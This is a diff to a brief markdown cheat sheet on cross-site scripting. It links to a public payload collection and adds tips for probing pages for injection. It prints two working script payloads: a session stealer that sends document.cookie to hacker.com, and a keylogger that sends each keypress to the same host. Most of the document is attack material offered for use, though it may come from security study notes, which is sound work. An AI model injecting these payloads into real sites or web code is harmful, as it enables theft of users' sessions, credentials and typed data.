@@ -2,6 +2,14 @@
 
 ## Payloads: https://github.com/swisskyrepo/PayloadsAllTheThings
 
+## Detection methods:
+
+### 1) Try injecting HTML code instead of JavaScript
+
+### 2) Make sure everything is escaped so that you can bypass basic defense mechanisms
+
+#### Example: <>/\script'"=
+
 ### Session stealing: <script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script>
 
 ### Keylogger: <script>document.onkeypress = function(p){ fetch ('https://hacker.com/log?key=' + btoa(p.key) );}</script>
